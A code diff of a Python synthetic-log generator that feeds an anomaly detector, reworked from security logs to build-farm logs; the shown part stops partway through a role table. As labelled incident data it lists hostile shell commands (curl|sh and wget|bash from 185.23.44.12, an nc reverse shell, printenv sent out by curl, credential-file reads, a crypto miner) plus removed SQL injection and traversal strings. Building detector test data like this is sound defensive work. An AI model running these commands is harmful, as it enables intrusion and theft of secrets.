@@ -1,32 +1,36 @@
 """
-Watchtower synthetic security log producer.
+Watchtower synthetic build-log producer.
 
-Simulates the security-log traffic of a mid-sized company: roughly 180
-hosts across workstations, servers, automation and remote staff, plus
-occasional attacks from hostile infrastructure.
+Simulates the build logs of a mid-sized company's build farm: roughly 180
+runners across developer workstations, build servers, a CI farm and
+spot-instance and vendor agents, plus occasional incidents that make a
+runner misbehave -- an out-of-memory storm, a crashing compiler, a poisoned
+cache.
 
-WHY A POPULATION, NOT A HANDFUL OF IPs
---------------------------------------
-With 4 IPs, every source looks busy -- 25 events/sec each -- and "high
-volume" is meaningless. With ~180 hosts sharing 100 events/sec, a typical
-host emits well under one event/sec, so a source producing 30/sec is
+WHY A POPULATION, NOT A HANDFUL OF RUNNERS
+------------------------------------------
+With 4 runners, every one looks busy -- 25 events/sec each -- and "high
+volume" is meaningless. With ~180 runners sharing 100 events/sec, a typical
+runner emits well under one event/sec, so one producing 30 failures/sec is
 genuinely exceptional. That contrast is the entire signal the detector
 works from.
 
-Traffic is deliberately UNEVEN. A few hosts (monitoring agents, backup
-jobs, CI runners) generate far more than everyone else, and they are
-entirely legitimate. They exist here on purpose: they are the false
-positives a detector has to learn not to flag. A system that alerts on
-volume alone will flag the backup server every night.
+Traffic is deliberately UNEVEN. A few runners (the CI farm) generate far
+more than everyone else, and they are entirely healthy. They exist here on
+purpose: they are the false positives a detector has to learn not to flag.
+A system that alerts on volume alone will flag the CI farm every morning.
 
-ATTACK RATE
------------
-Attacks are episodic and rare, around 5-10% of traffic. That is not
-cosmetic -- a stream that is half attack traffic inflates apparent recall
-and hides how much detection actually costs. Raise ATTACK_START_CHANCE for
-a demo, but do not judge alert volume or API cost from such a run.
+INCIDENT RATE
+-------------
+Incidents are episodic and rare, around 5-10% of traffic. That is not
+cosmetic -- a stream that is half incident traffic inflates apparent recall
+and hides how much detection actually costs. Raise INCIDENT_START_CHANCE
+for a demo, but do not judge alert volume or API cost from such a run.
 
-Every event carries `scenario` -- "normal" or the attack name. That is
+Incidents strike ORDINARY runners, ones that also carry on with their
+normal work: there is no "bad IP" to learn, only behaviour.
+
+Every event carries `scenario` -- "normal" or the incident name. That is
 GROUND TRUTH for evaluation, not a feature. The ETL parse schema does not
 read it, so it never reaches the detector.
 """
@@ -59,115 +63,199 @@ KAFKA_TOPIC = os.getenv("KAFKA_TOPIC", "security-logs")
 SCHEMA_REGISTRY_URL = os.getenv("SCHEMA_REGISTRY_URL", "http://localhost:8081")
 LOGS_PER_SECOND = int(os.getenv("LOGS_PER_SECOND", "1000"))
 
-# The company grows with the rate. At 1,000 logs/sec the network is ~1,780
-# hosts, not 178 hosts each logging 10x more: a real company producing 10x
-# the logs has more machines, not chattier ones. Keeping per-host behaviour
-# constant is what keeps per-host detection thresholds meaningful -- at 10x
-# per host, every workstation's ordinary failed logins would look like a
-# brute force. Set HOSTS_SCALE=1 for the literal 178 hosts.
+# The farm grows with the rate. At 1,000 logs/sec it is ~1,780 runners, not
+# 178 runners each logging 10x more: a company producing 10x the build logs
+# has more machines, not chattier ones. Keeping per-runner behaviour
+# constant is what keeps per-runner detection thresholds meaningful -- at
+# 10x per runner, every workstation's ordinary failed builds would look
+# like a failure storm. Set HOSTS_SCALE=1 for the literal 178 runners.
 HOSTS_SCALE = max(1, int(os.getenv("HOSTS_SCALE", str(max(1, round(LOGS_PER_SECOND / 100))))))
 
-# Hard ceiling on the per-second budget attacks may consume, even with
+# Hard ceiling on the per-second budget incidents may consume, even with
 # several live at once. The remainder is always baseline traffic.
-MAX_ATTACK_SHARE = 0.25
+MAX_INCIDENT_SHARE = 0.25
 
-# Chance per second that a new attack of a given kind begins, when none of
+# Chance per second that a new incident of a given kind begins, when none of
 # that kind is already running.
-ATTACK_START_CHANCE = 0.003
+INCIDENT_START_CHANCE = 0.003
 
 
 # --- the company ----------------------------------------------------------
 
-EMPLOYEES = [
+DEVELOPERS = [
     "a.bennani", "y.tazi", "s.elamrani", "m.chraibi", "k.idrissi",
     "n.berrada", "h.lahlou", "r.ouazzani", "f.saidi", "l.benjelloun",
     "o.fassi", "z.kabbaj", "i.alaoui", "d.sekkat", "t.mansouri",
     "j.doe", "alice", "bob", "john",
 ]
 
-# Non-human accounts. These legitimately run a lot of commands, which is
-# exactly why they are a detector's favourite false positive.
-SERVICE_ACCOUNTS = [
-    "svc-backup", "svc-monitor", "svc-deploy", "svc-nginx", "svc-postgres",
+# Non-human accounts that start builds. They legitimately start a lot of
+# them, which is exactly why they are a detector's favourite false positive.
+CI_ACCOUNTS = ["svc-ci", "svc-nightly", "svc-release"]
+
+# (project, language). Each language fixes the toolchain, the build tool
+# that drives it and what a step costs.
+PROJECTS = [
+    ("payments-api", "java"), ("billing-core", "java"), ("ledger", "java"),
+    ("auth-service", "go"), ("gateway", "go"), ("notifications", "go"),
+    ("web-frontend", "ts"), ("docs-site", "ts"), ("admin-console", "ts"),
+    ("search-indexer", "rust"), ("recommender", "rust"), ("infra-tools", "rust"),
+    ("kernel-modules", "c"), ("firmware-agent", "c"), ("crypto-lib", "c"),
+    ("ml-runtime", "cpp"), ("data-warehouse", "cpp"), ("render-engine", "cpp"),
+    ("mobile-android", "java"), ("mobile-ios", "cpp"), ("telemetry", "go"),
+    ("etl-jobs", "java"), ("sdk-core", "rust"), ("edge-proxy", "cpp"),
 ]
+PROJECT_NAMES = [name for name, _ in PROJECTS]
+LANG_OF = dict(PROJECTS)
 
-ADMINS = ["admin", "root", "s.elamrani", "k.idrissi"]
+# What a step costs, per language: duration ranges in ms and peak memory in
+# MB for a compile, the compiler binary, the tool driving it, the file
+# extension, and the build tool's user agent for dependency fetches.
+LANGS = {
+    "c":    dict(proc="gcc",     parent="make",   ext=".c",    tool="make",   compile=(300, 9_000),   link=(2_000, 60_000),   mem=(60, 700),
+                 agent="conan/2.4.1", cmd="gcc -O2 -Wall -std=c17 -c {file} -o build/{stem}.o"),
+    "cpp":  dict(proc="clang++", parent="ninja",  ext=".cc",   tool="ninja",  compile=(2_000, 60_000), link=(15_000, 230_000), mem=(300, 3_200),
+                 agent="conan/2.4.1", cmd="clang++ -O2 -std=c++20 -Wall -c {file} -o build/{stem}.o"),
+    "rust": dict(proc="rustc",   parent="cargo",  ext=".rs",   tool="cargo",  compile=(1_500, 45_000), link=(5_000, 120_000),  mem=(200, 2_400),
+                 agent="cargo/1.82.0", cmd="rustc --edition 2021 -C opt-level=3 {file} --crate-type lib"),
+    "java": dict(proc="javac",   parent="gradle", ext=".java", tool="gradle", compile=(800, 20_000),   link=(3_000, 40_000),   mem=(250, 1_800),
+                 agent="gradle/8.10.2", cmd="javac -d build/classes -source 21 {file}"),
+    "ts":   dict(proc="tsc",     parent="npm",    ext=".ts",   tool="npm",    compile=(500, 12_000),   link=(2_000, 30_000),   mem=(150, 1_200),
+                 agent="npm/10.8.2", cmd="tsc -p tsconfig.json --outDir dist --incremental"),
+    "go":   dict(proc="go",      parent="make",   ext=".go",   tool="go",     compile=(400, 8_000),    link=(1_500, 25_000),   mem=(100, 900),
+                 agent="go/1.23.2", cmd="go build -o bin/{stem} {file}"),
+}
+LINK_COMMANDS = {
+    "c": "ld -o build/app build/*.o -lc", "cpp": "clang++ -o build/app build/*.o -lstdc++",
+    "rust": "rustc -C lto build/app.rlib -o build/app", "java": "jar cf build/app.jar -C build/classes .",
+    "ts": "webpack --mode production", "go": "go build -ldflags='-s -w' -o bin/app ./cmd/app",
+}
 
-BENIGN_COMMANDS = [
-    "ls", "whoami", "ps aux", "df -h", "uptime",
-    "systemctl status nginx", "tail -f /var/log/app.log",
-    "docker ps", "kubectl get pods", "git pull",
-    "pg_dump -U postgres app", "rsync -a /data /backup",
+MODULES = ["core", "net", "storage", "auth", "parser", "codec", "sched", "cache", "api", "util"]
+SOURCE_NAMES = ["parser", "lexer", "buffer", "session", "router", "index", "writer", "reader", "pool", "queue",
+                "handler", "config", "metrics", "codec", "driver"]
+
+# The failures a healthy farm has all the time: the code is wrong, not the
+# machine. A detector that alerts on these alerts on every working day.
+ORDINARY_COMPILE_ERRORS = [
+    "error: expected ';' before '}' token",
+    "error: 'foo' was not declared in this scope",
+    "undefined reference to `Session::close()'",
+    "error: cannot find symbol: method resolve(String)",
+    "error[E0308]: mismatched types",
+    "TS2345: Argument of type 'string' is not assignable to parameter of type 'number'",
+    "./main.go:41:2: undefined: handler",
 ]
+ORDINARY_TEST_FAILURES = [
+    "AssertionError: expected 3 but was 4",
+    "FAILED tests/test_session.py::test_expiry - assert 0 == 1",
+    "--- FAIL: TestRouter (0.02s)",
+    "thread 'queue::tests::drains' panicked at 'assertion failed'",
+]
+FAILURE_REASONS = ["compile_error", "test_failure", "link_error", "dependency_unresolved", "timeout"]
+FAILURE_REASON_WEIGHTS = [46, 30, 8, 12, 4]
+ORDINARY_MESSAGES = {
+    "compile_error": ORDINARY_COMPILE_ERRORS,
+    "test_failure": ORDINARY_TEST_FAILURES,
+    "link_error": ["undefined reference to `main'", "ld: cannot find -lssl"],
+    "dependency_unresolved": ["Could not resolve com.acme:legacy-client:2.1", "no matching package named `serde_xml` found"],
+    "timeout": ["build exceeded 60m timeout"],
+}
 
-HOSTILE_COMMANDS = [
-    "cat /etc/shadow",
-    "cat /etc/passwd",
-    "sudo su -",
-    "wget http://185.23.44.12/x.sh -O /tmp/x.sh",
-    "chmod +x /tmp/x.sh && /tmp/x.sh",
-    "useradd -m -G sudo backdoor",
-    "cat ~/.ssh/id_rsa",
-    "history -c",
+# What a build infrastructure problem looks like -- see core/indicators.py.
+ROGUE_COMMANDS = [
+    "curl -s http://185.23.44.12/x.sh | sh",
+    "wget -qO- http://185.23.44.12/setup | bash",
+    "./xmrig --url stratum+tcp://pool.minexmr.example:4444",
     "nc -e /bin/sh 185.23.44.12 4444",
+    "cat ~/.aws/credentials",
+    "printenv | curl -d @- http://185.23.44.12/env",
+    "chmod +x /tmp/x.sh && /tmp/x.sh",
+    "cat ~/.ssh/id_rsa",
 ]
-
-SCAN_PORTS = [
-    21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
-    1433, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 27017,
+UNTRUSTED_PATHS = [
+    "/unofficial/mirror/libssl-9.9.jar",
+    "/unverified/crates/tokio-fork/1.99.0/download",
+    "/snapshots-unsigned/com/acme/core-LATEST.jar",
+    "/tmp/x.sh",
+    "/dl/setup.sh",
+]
+OOM_MESSAGES = [
+    "clang: error: unable to execute command: Killed",
+    "c++: fatal error: Killed signal terminated program cc1plus",
+    "java.lang.OutOfMemoryError: Java heap space",
+    "rustc: error: could not compile `core`: process didn't exit successfully (signal: 9, SIGKILL: kill)",
+]
+CRASH_MESSAGES = [
+    "clang: error: clang frontend command failed due to signal (use -v to see invocation)",
+    "internal compiler error: Segmentation fault",
+    "PLEASE submit a full bug report, with preprocessed source if appropriate.",
+    "Stack dump: 0. Program arguments: /usr/bin/clang++ -cc1",
+]
+TOOLCHAIN_MESSAGES = [
+    "toolchain not found: clang-18",
+    "No space left on device",
+    "error while loading shared libraries: libstdc++.so.6: cannot open shared object file",
+    "permission denied: /opt/toolchain/bin/gcc",
+]
+CORRUPT_MESSAGES = [
+    "checksum mismatch for cache entry {h}",
+    "sha256 mismatch: expected {h}",
+    "corrupt cache entry {h}: unexpected end of archive",
 ]
 
 
 class Host:
-    """One machine on the network, with a role that shapes its behaviour.
+    """One runner on the network, with a role that shapes its behaviour.
 
-    `weight` is its share of baseline traffic. Deliberately skewed: a
-    monitoring agent is worth ~60 workstations.
+    `weight` is its share of baseline traffic. Deliberately skewed: a CI
+    farm runner is worth ~60 workstations.
     """
 
-    def __init__(self, ip, role, weight, users, hostname):
+    def __init__(self, ip, role, weight, projects, hostname, accounts):
         self.ip = ip
         self.role = role
         self.weight = weight
-        self.users = users
+        self.projects = projects
         self.hostname = hostname
+        self.accounts = accounts
 
 
 def build_network(scale=1):
-    """The company. Host counts multiply by `scale`; every host keeps the
-    same role, weight and behaviour, so per-host rates stay constant."""
+    """The farm. Runner counts multiply by `scale`; every runner keeps the
+    same role, weight and behaviour, so per-runner rates stay constant."""
     hosts = []
 
-    # Employee workstations, one primary user each -- which is why a
-    # workstation suddenly touching many accounts is worth noticing.
+    # Developer workstations, one project each -- which is why a runner
+    # suddenly failing builds of many projects is worth noticing.
     for i in range(120 * scale):
         ip = f"192.168.{1 + i // 240}.{10 + i % 240}"
-        hosts.append(Host(ip, "workstation", 1.0, [EMPLOYEES[i % len(EMPLOYEES)]], f"ws-{i:04d}"))
+        project = PROJECT_NAMES[i % len(PROJECT_NAMES)]
+        hosts.append(Host(ip, "workstation", 1.0, [project], f"ws-{i:04d}", [DEVELOPERS[i % len(DEVELOPERS)]]))
 
-    # Application and database servers.
+    # Shared build servers: a few projects each.
     for i in range(24 * scale):
         ip = f"10.0.{10 + i // 24}.{10 + i % 24}"
-        hosts.append(Host(ip, "server", 4.0,
-                          random.sample(SERVICE_ACCOUNTS, 2) + ["root"], f"srv-app-{i:03d}"))
+        hosts.append(Host(ip, "build-server", 4.0, random.sample(PROJECT_NAMES, 2),
+                          f"build-{i:03d}", CI_ACCOUNTS + DEVELOPERS[:4]))
 
-    # Automation. Very high volume, entirely legitimate -- the benign heavy
-    # hitters that make "high volume == attack" a bad rule.
-    roles = [("monitoring", "svc-monitor"), ("backup", "svc-backup"),
-             ("ci-runner", "svc-deploy"), ("ci-runner", "svc-deploy")]
+    # The CI farm. Very high volume, entirely healthy -- the benign heavy
+    # hitters that make "high volume == incident" a bad rule.
     for i in range(4 * scale):
-        name, account = roles[i % 4]
-        hosts.append(Host(f"10.0.20.{5 + i}", "automation", 60.0, [account], f"{name}-{i:02d}"))
+        hosts.append(Host(f"10.0.20.{5 + i}", "ci-farm", 60.0, random.sample(PROJECT_NAMES, 2),
+                          f"ci-{i:02d}", CI_ACCOUNTS))
 
-    # Remote staff on public IPs -- legitimately external, so "external
-    # therefore suspicious" is also a bad rule.
+    # Cloud spot runners on public IPs -- legitimately external, so
+    # "external therefore suspicious" is a bad rule here too.
     for i in range(25 * scale):
         ip = f"102.67.{14 + i // 200}.{40 + i % 200}"
-        hosts.append(Host(ip, "remote", 2.0, [EMPLOYEES[i % len(EMPLOYEES)]], f"vpn-{i:03d}"))
+        hosts.append(Host(ip, "cloud", 2.0, [PROJECT_NAMES[i % len(PROJECT_NAMES)]],
+                          f"spot-{i:03d}", ["svc-ci"]))
 
-    # Partner and branch ranges.
+    # Vendor build agents.
     for i in range(5 * scale):
         ip = f"196.200.{1 + i // 50}.{10 + i % 50}"
-        hosts.append(Host(ip, "partner", 1.5, ["partner-api"], f"partner-{i:02d}"))
+        hosts.append(Host(ip, "vendor", 1.5, [random.choice(PROJECT_NAMES)], f"vendor-{i:02d}", ["svc-vendor"]))
 
     return hosts
 
@@ -175,17 +263,11 @@ def build_network(scale=1):
 NETWORK = build_network(HOSTS_SCALE)
 # Cumulative weights computed once. random.choices(weights=...) recomputes
 # them on every call -- O(hosts) per event, 1.78 million additions a second
-# at 1,000 logs/sec over ~1,780 hosts.
+# at 1,000 logs/sec over ~1,780 runners.
 NETWORK_CUM_WEIGHTS = list(itertools.accumulate(h.weight for h in NETWORK))
 
-# Attacker infrastructure. Never emits baseline traffic, so an IP-reputation
-# or first-seen feature has something real to separate.
-HOSTILE_IPS = [
-    "185.23.44.12",
-    "41.251.72.91",
-    "45.134.26.7",
-    "193.201.9.88",
-]
+# Where dependencies and artifacts are served from.
+REGISTRIES = ["10.0.40.10", "10.0.40.11", "10.0.40.12"]
 
 
 def _now():
@@ -193,266 +275,270 @@ def _now():
 
 
 # --- identities ------------------------------------------------------------
-# uids matter: 0 is root, and a detector needs to know who a command ran as.
-UIDS = {"root": 0, "admin": 1000, "partner-api": 2001}
-UIDS.update({name: 1001 + i for i, name in enumerate(EMPLOYEES)})
-UIDS.update({name: 990 + i for i, name in enumerate(SERVICE_ACCOUNTS)})
-
-# The company's web application, and the servers people SSH into.
-WEB_SERVERS = ["10.0.10.10", "10.0.10.11", "10.0.10.12"]
-SSH_TARGETS = [f"10.0.10.{n}" for n in range(10, 34)]   # the first server rack
-
-BROWSERS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0",
-]
-PARTNER_AGENT = "partner-sync/2.3 python-requests/2.32"
-
-# Ordinary requests to the company app: (method, path, status, bytes range).
-NORMAL_REQUESTS = [
-    ("GET", "/", 200, (8_000, 20_000)),
-    ("GET", "/dashboard", 200, (15_000, 60_000)),
-    ("POST", "/login", 200, (800, 2_000)),
-    ("GET", "/api/v1/orders", 200, (2_000, 40_000)),
-    ("POST", "/api/v1/orders", 201, (500, 1_500)),
-    ("GET", "/api/v1/products?id={n}", 200, (1_000, 6_000)),
-    ("GET", "/static/app.3f9c1a.js", 200, (180_000, 320_000)),
-    ("GET", "/static/logo.png", 304, (0, 0)),
-    ("GET", "/api/v1/reports/export?month=2026-08", 200, (2_000_000, 5_000_000)),
-    # benign noise that looks alarming in isolation
-    ("GET", "/favicon.ico", 404, (150, 150)),
-    ("POST", "/login", 401, (400, 600)),
-]
-NORMAL_REQUEST_WEIGHTS = [10, 14, 5, 14, 6, 12, 9, 8, 1, 3, 2]
-
-NORMAL_FILES = [
-    ("/home/{user}/notes.md", "read"), ("/home/{user}/report.xlsx", "write"),
-    ("/srv/app/config.yaml", "read"), ("/var/log/app/app.log", "read"),
-    ("/srv/data/exports/orders.csv", "write"),
-]
-
-# Legitimate automation, some of it genuinely as root. A rule that treats
-# "ran as root" as malicious alerts on the nightly backup.
-AUTOMATION_COMMANDS = {
-    "svc-backup": [("rsync -a /srv/data /backup/data", "rsync", 0),
-                   ("pg_dump -U postgres app > /backup/app.sql", "pg_dump", 0)],
-    "svc-monitor": [("df -h", "df", 991), ("systemctl status nginx", "systemctl", 991),
-                    ("curl -s http://localhost/healthz", "curl", 991)],
-    "svc-deploy": [("docker pull registry.local/app:latest", "docker", 992),
-                   ("kubectl rollout status deploy/app", "kubectl", 992),
-                   ("git pull", "git", 992)],
-}
-
-# --- attack payloads -------------------------------------------------------
-SQLI_PATHS = [
-    "/api/v1/products?id=42' OR '1'='1",
-    "/api/v1/products?id=42 UNION SELECT username,password FROM users--",
-    "/api/v1/products?id=42%27%20OR%201%3D1--",
-    "/login?user=admin'--",
-    "/api/v1/orders?sort=id;DROP TABLE orders--",
-]
-TRAVERSAL_PATHS = [
-    "/static/../../../../etc/passwd",
-    "/download?file=../../../etc/shadow",
-    "/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
-    "/api/v1/reports/export?template=....//....//etc/hosts",
-]
-SCAN_PATHS = [
-    "/.env", "/.git/config", "/wp-admin/", "/wp-login.php", "/phpmyadmin/",
-    "/admin/", "/server-status", "/backup.zip", "/config.php.bak", "/.aws/credentials",
-    "/actuator/env", "/api/swagger.json", "/.DS_Store", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
-]
-SCANNER_AGENTS = ["sqlmap/1.8.2#stable (https://sqlmap.org)", "gobuster/3.6", "Nikto/2.5.0", "Mozilla/5.0 zgrab/0.x"]
+# uids matter: 0 is root, and a detector needs to know who a step ran as.
+UIDS = {"root": 0, "svc-vendor": 2001}
+UIDS.update({name: 1001 + i for i, name in enumerate(DEVELOPERS)})
+UIDS.update({name: 990 + i for i, name in enumerate(CI_ACCOUNTS)})
 
 
-def _severity_for(event_type):
+def _uid(host, account):
+    """Who a step ran as. CI containers genuinely run as root about a
+    third of the time -- a rule that treats root as wrong alerts on the farm."""
+    if host.role == "ci-farm" and random.random() < 0.35:
+        return 0
+    return UIDS.get(account, 1500)
+
+
+def _severity_for(event_type, outcome, status=0):
     """Severity that corresponds to the event, rather than being random.
 
     An earlier version chose this at random, producing nonsense such as
-    LOGIN_SUCCESS / severity=ERROR. A model given that field learns noise.
+    BUILD_SUCCESS / severity=ERROR. A model given that field learns noise.
     """
-    if event_type in ("LOGIN_FAILURE", "PORT_SCAN", "COMMAND_EXECUTION"):
+    if outcome == "failure":
+        return "ERROR"
+    if event_type == "DEPENDENCY_FETCH" and status >= 400:
         return "WARNING"
     return "INFO"
 
 
-def _event(event_type, source_ip, user, hostname, scenario, **extra):
+def _event(event_type, runner_ip, project, hostname, scenario, **extra):
     log = {
         "event_id": str(uuid.uuid4()),
         "timestamp": _now(),
-        "source_ip": source_ip,
-        "user": user,
+        "runner_ip": runner_ip,
+        "project": project,
         "event_type": event_type,
         "hostname": hostname,
-        "severity": _severity_for(event_type),
+        "severity": _severity_for(event_type, extra.get("outcome"), extra.get("http_status") or 0),
         "scenario": scenario,
     }
     log.update(extra)
     return log
 
 
-def _session():
+def _build_id():
     return uuid.uuid4().hex[:16]
 
 
-# --- context builders: one per kind of log ---------------------------------
+def _source_file(project):
+    ext = LANGS[LANG_OF.get(project, "c")]["ext"]
+    return f"src/{random.choice(MODULES)}/{random.choice(SOURCE_NAMES)}{ext}"
 
-def ssh_login(src, user, host, scenario, success, auth="publickey", reason=None, dest=None):
+
+# --- event builders: one per kind of log -----------------------------------
+
+def build_started(src, project, host, scenario, who, build=None):
     return _event(
-        "LOGIN_SUCCESS" if success else "LOGIN_FAILURE", src, user, host, scenario,
-        log_source="sshd", outcome="success" if success else "failure",
-        session_id=_session(), dest_ip=dest or random.choice(SSH_TARGETS),
-        dest_port=22, protocol="ssh", auth_method=auth,
-        process_name="sshd", reason=reason,
+        "BUILD_STARTED", src, project, host, scenario,
+        log_source=LANGS[LANG_OF.get(project, "c")]["tool"], build_id=build or _build_id(),
+        triggered_by=who,
     )
 
 
-def ssh_connection(src, user, host, scenario, dest=None):
+def build_success(src, project, host, scenario, who, duration=None):
     return _event(
-        "SSH_CONNECTION", src, user, host, scenario,
-        log_source="sshd", outcome="allowed", session_id=_session(),
-        dest_ip=dest or random.choice(SSH_TARGETS), dest_port=22, protocol="ssh",
-        process_name="sshd",
+        "BUILD_SUCCESS", src, project, host, scenario,
+        log_source=LANGS[LANG_OF.get(project, "c")]["tool"], outcome="success", build_id=_build_id(),
+        triggered_by=who,
+        duration_ms=duration if duration is not None else random.randint(30_000, 1_500_000),
     )
 
 
-def file_access(src, user, host, scenario, path, operation, uid=None, process="python3"):
+def build_failure(src, project, host, scenario, who, reason, message, exit_code=1, duration=None):
     return _event(
-        "FILE_ACCESS", src, user, host, scenario,
-        log_source="auditd", outcome="success",
-        file_path=path, file_operation=operation,
-        process_name=process, process_id=random.randint(1000, 60000),
-        process_uid=UIDS.get(user, 1500) if uid is None else uid,
+        "BUILD_FAILURE", src, project, host, scenario,
+        log_source=LANGS[LANG_OF.get(project, "c")]["tool"], outcome="failure", build_id=_build_id(),
+        triggered_by=who, reason=reason, error_message=message, exit_code=exit_code,
+        duration_ms=duration if duration is not None else random.randint(5_000, 600_000),
     )
 
 
-def command(src, user, host, scenario, cmd, process, uid, parent="bash"):
+def compile_step(src, project, host, scenario, who, uid, *, step="compile", command=None, file=None,
+                 duration=None, memory=None, cache=None, outcome="success", exit_code=0, message=None,
+                 parent=None, process=None, cache_hit_rate=0.78):
+    lang = LANGS[LANG_OF.get(project, "c")]
+    file = file or _source_file(project)
+    stem = file.rsplit("/", 1)[-1].rsplit(".", 1)[0]
+    if cache is None:
+        cache = "hit" if random.random() < cache_hit_rate else "miss"
+    lo, hi = lang["link"] if step == "link" else lang["compile"]
+    if duration is None:
+        # a cache hit only restores the output
+        duration = random.randint(5, 80) if cache == "hit" else random.randint(lo, hi)
+    if memory is None:
+        mlo, mhi = lang["mem"]
+        memory = random.randint(20, 80) if cache == "hit" else random.randint(mlo, mhi)
+    if command is None:
+        command = LINK_COMMANDS[LANG_OF.get(project, "c")] if step == "link" else lang["cmd"].format(file=file, stem=stem)
     return _event(
-        "COMMAND_EXECUTION", src, user, host, scenario,
-        log_source="sudo" if cmd.startswith("sudo") else "auditd", outcome="success",
-        command=cmd, process_name=process, process_id=random.randint(1000, 60000),
-        parent_process=parent, process_uid=uid,
+        "COMPILE_STEP", src, project, host, scenario,
+        log_source=lang["tool"], outcome=outcome, build_id=_build_id(), triggered_by=who,
+        command=command, process_name=process or lang["proc"], process_id=random.randint(1000, 60000),
+        parent_process=parent or lang["parent"], process_uid=uid, step=step, file_path=file,
+        duration_ms=duration, peak_memory_mb=memory, cache_status=cache, exit_code=exit_code,
+        error_message=message,
     )
 
 
-def http(src, user, host, scenario, method, path, status, agent, size, dest=None, rt=None):
+def tests_run(src, project, host, scenario, who, success=True, message=None):
     return _event(
-        "HTTP_REQUEST", src, user, host, scenario,
-        log_source="nginx", outcome="success" if status < 400 else "failure",
-        session_id=_session(), dest_ip=dest or random.choice(WEB_SERVERS),
-        dest_port=443, protocol="https",
-        http_method=method, url_path=path, http_status=status,
-        user_agent=agent, bytes_sent=size,
+        "TEST_RUN", src, project, host, scenario,
+        log_source=LANGS[LANG_OF.get(project, "c")]["tool"], outcome="success" if success else "failure",
+        build_id=_build_id(), triggered_by=who, exit_code=0 if success else 1,
+        duration_ms=random.randint(3_000, 400_000), peak_memory_mb=random.randint(100, 1_500),
+        error_message=None if success else (message or random.choice(ORDINARY_TEST_FAILURES)),
+    )
+
+
+def dependency_fetch(src, project, host, scenario, who, path, status, size, agent=None, dest=None, rt=None):
+    lang = LANGS[LANG_OF.get(project, "c")]
+    return _event(
+        "DEPENDENCY_FETCH", src, project, host, scenario,
+        log_source=lang["tool"], outcome="success" if status < 400 else "failure",
+        build_id=_build_id(), triggered_by=who, dest_ip=dest or random.choice(REGISTRIES),
+        dest_port=443, protocol="https", http_method="GET", url_path=path, http_status=status,
+        user_agent=agent or lang["agent"], bytes_sent=size,
         response_time_ms=rt if rt is not None else random.randint(8, 180),
     )
 
 
-def port_probe(src, user, host, scenario, port, dest=None):
+def artifact_publish(src, project, host, scenario, who, size, status=201, rt=None):
     return _event(
-        "PORT_SCAN", src, user, host, scenario,
-        log_source="firewall", outcome="denied",
-        dest_ip=dest or random.choice(SSH_TARGETS), dest_port=port, protocol="tcp",
-        target_port=port,
+        "ARTIFACT_PUBLISH", src, project, host, scenario,
+        log_source=LANGS[LANG_OF.get(project, "c")]["tool"], outcome="success" if status < 400 else "failure",
+        build_id=_build_id(), triggered_by=who, dest_ip=random.choice(REGISTRIES), dest_port=443,
+        protocol="https", http_method="PUT",
+        url_path=f"/artifacts/{project}/{_build_id()}/{project}.tar.gz", http_status=status,
+        user_agent=LANGS[LANG_OF.get(project, "c")]["agent"], bytes_sent=size,
+        response_time_ms=rt if rt is not None else random.randint(200, 3_000),
     )
 
 
 # --- baseline -------------------------------------------------------------
 
-# Each role behaves differently. A workstation mostly browses and reads
-# files; automation almost only runs commands; partners only call the API.
+# Ordinary dependency fetches, per ecosystem: (path template, size range).
+FETCH_PATHS = {
+    "java": [("/maven2/org/apache/commons/commons-lang3/3.{n}.0/commons-lang3-3.{n}.0.jar", (500_000, 700_000)),
+             ("/maven2/com/fasterxml/jackson/jackson-core/2.{n}.1/jackson-core-2.{n}.1.jar", (350_000, 600_000))],
+    "go": [("/goproxy/github.com/acme/lib{n}/@v/v1.{n}.0.zip", (40_000, 800_000))],
+    "ts": [("/npm/react/-/react-18.{n}.0.tgz", (90_000, 400_000)), ("/npm/lodash/-/lodash-4.17.{n}.tgz", (300_000, 600_000))],
+    "rust": [("/crates/api/v1/crates/serde/1.0.{n}/download", (60_000, 90_000)),
+             ("/crates/api/v1/crates/tokio/1.{n}.0/download", (700_000, 900_000))],
+    "c": [("/conan/v2/conans/zlib/1.{n}/_/_/revisions/latest/files/conan_package.tgz", (100_000, 400_000))],
+    "cpp": [("/conan/v2/conans/boost/1.{n}/_/_/revisions/latest/files/conan_package.tgz", (4_000_000, 30_000_000))],
+}
+
+# Each role behaves differently. A workstation compiles a bit and fetches a
+# bit; the CI farm almost only compiles; vendor agents mostly fetch.
 ROLE_PROFILES = {
     "workstation": (
-        ["HTTP_REQUEST", "FILE_ACCESS", "LOGIN_SUCCESS", "COMMAND_EXECUTION", "SSH_CONNECTION", "LOGIN_FAILURE"],
-        [40, 20, 14, 12, 8, 6],
+        ["COMPILE_STEP", "DEPENDENCY_FETCH", "BUILD_STARTED", "BUILD_SUCCESS", "TEST_RUN", "BUILD_FAILURE", "ARTIFACT_PUBLISH"],
+        [40, 16, 10, 11, 12, 10, 1],
     ),
-    "server": (
-        ["FILE_ACCESS", "COMMAND_EXECUTION", "SSH_CONNECTION", "LOGIN_SUCCESS", "HTTP_REQUEST", "LOGIN_FAILURE"],
-        [34, 28, 14, 12, 9, 3],
+    "build-server": (
+        ["COMPILE_STEP", "DEPENDENCY_FETCH", "BUILD_STARTED", "BUILD_SUCCESS", "TEST_RUN", "BUILD_FAILURE", "ARTIFACT_PUBLISH"],
+        [42, 14, 12, 12, 14, 2.5, 2],
     ),
-    "automation": (
-        ["COMMAND_EXECUTION", "FILE_ACCESS", "SSH_CONNECTION", "LOGIN_SUCCESS"],
-        [55, 30, 10, 5],
+    # Failures are rare here: ~0.16% of ~700 events a minute is still ~1.
+    "ci-farm": (
+        ["COMPILE_STEP", "DEPENDENCY_FETCH", "TEST_RUN", "BUILD_STARTED", "BUILD_SUCCESS", "BUILD_FAILURE", "ARTIFACT_PUBLISH"],
+        [58, 14, 14, 3.5, 3.5, 0.15, 0.2],
     ),
-    "remote": (
